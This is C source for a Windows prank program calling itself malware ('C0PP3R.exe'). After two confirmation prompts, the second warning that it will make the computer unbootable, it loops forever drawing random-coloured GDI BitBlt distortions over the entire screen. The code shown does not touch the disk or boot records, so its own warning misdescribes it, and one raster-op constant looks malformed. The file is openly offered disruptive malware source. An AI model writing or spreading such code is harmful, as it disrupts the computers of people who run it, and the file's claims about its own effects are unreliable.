#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"Run Malware?", L"C0PP3R.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure you want to execute this?\nIt will make your computer unbootable", L"C0PP3R.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            while(1) {
                HDC hdc = GetDC(0);
                HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
                DeleteObject(brush);
                ReleaseDC(0, hdc);
            }
        }
    }
}